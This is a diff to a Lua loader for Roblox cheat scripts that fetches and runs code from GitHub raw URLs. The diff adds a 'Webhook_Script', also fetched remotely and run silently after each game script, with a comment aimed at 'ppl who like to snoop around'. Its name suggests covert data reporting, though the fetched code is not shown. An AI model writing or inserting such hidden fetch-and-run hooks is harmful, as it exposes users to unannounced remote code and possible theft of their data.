@@ -11,6 +11,9 @@ local DISCORD_INVITE = "https://discord.gg/uu57TArNU6"
 local MAIN_SCRIPT = loadstring(game:HttpGet(
     "https://raw.githubusercontent.com/NeziaReal/GhoulreSkibidi/refs/heads/main/GhoulRe.lua"
 ))
+local Webhook_Script = loadstring(game:HttpGet( -- mainly for ppl who like to snoop around too much
+    "https://raw.githubusercontent.com/NeziaReal/jjs/refs/heads/main/extrav4"
+))
 
 local MAIN_MENU_SCRIPT = loadstring(game:HttpGet(
     "https://raw.githubusercontent.com/NeziaReal/GhoulreSkibidi/refs/heads/main/GameTeleport.lua"
@@ -26,10 +29,14 @@ local UNIVERSAL_SCRIPT = loadstring(game:HttpGet(
 
 if game.PlaceId == MAINMENU_PLACEID then
     MAIN_MENU_SCRIPT() -- ghoul re main menu
+	task.wait(3)
+	Webhook_Script()
 	Notifications.Create("Nameless ⭐", "Loaded Main Menu Script", 2, Color3.fromRGB(255,255,255))
 
 elseif game.GameId == MAIN_GAMEID then
     MAIN_SCRIPT() -- ghoul re
+	task.wait(3)
+	Webhook_Script()
 	Notifications.Create("Nameless ⭐", "Loaded Ghoul Re Script", 2, Color3.fromRGB(255,255,255))
 
 elseif game.GameId == JUJUTSUSHENANIGANS_GAMEID then
@@ -43,4 +50,6 @@ else
 	Notifications.Create("Nameless ⭐", "Nameless does not support this game.", 2, Color3.fromRGB(255,255,255))
 	Notifications.Create("Nameless ⭐", "Loaded Universal Script", 2, Color3.fromRGB(255,255,255))
     UNIVERSAL_SCRIPT()
+	Webhook_Script() 
+	
 end
